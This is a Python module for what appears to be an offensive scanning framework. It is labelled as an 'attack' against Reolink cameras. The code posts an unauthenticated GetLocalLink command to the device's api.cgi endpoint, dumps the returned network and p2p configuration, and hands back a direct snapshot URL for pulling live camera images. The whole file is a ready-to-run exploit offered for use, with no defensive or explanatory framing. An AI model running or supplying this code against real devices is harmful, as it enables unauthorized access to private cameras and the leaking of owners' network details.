import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "reolink/api_leak_attack"
        self.description = "Exploit engine to dump operational connection grids and leak system fields from Reolink devices."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            base_url = f"http://{target}:{port}"
        else:
            base_url = target.rstrip('/')
            
        url = f"{base_url}/cgi-bin/api.cgi?cmd=GetLocalLink"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) cam-hunter/1.0",
            "Content-Type": "application/json"
        }
        
        # Payload demandant l'arborescence des paramètres réseau et p2p locaux
        payload = [{"cmd": "GetLocalLink", "action": 0, "param": {}}]
        
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print("\033[1;33m[*] Forcing Reolink backend API to leak system metadata blocks...\033[0m")
                response = await client.post(url, headers=headers, json=payload)
                
                if response.status_code == 200 and "value" in response.text:
                    # Lien direct alternatif exposé pour capturer une image fixe en direct
                    snapshot_route = f"{base_url}/cgi-bin/api.cgi?cmd=Snap&channel=0"
                    
                    return {
                        "success": True,
                        "details": (
                            f"Reolink API data structure dumped successfully!\n"
                            f"  -> Direct Snapshot Access Point: {snapshot_route}\n"
                            f"  -> Raw Response Payload: {response.text.strip()[:500]}..."
                        )
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit delivery executed but target system rejected data parameters."}
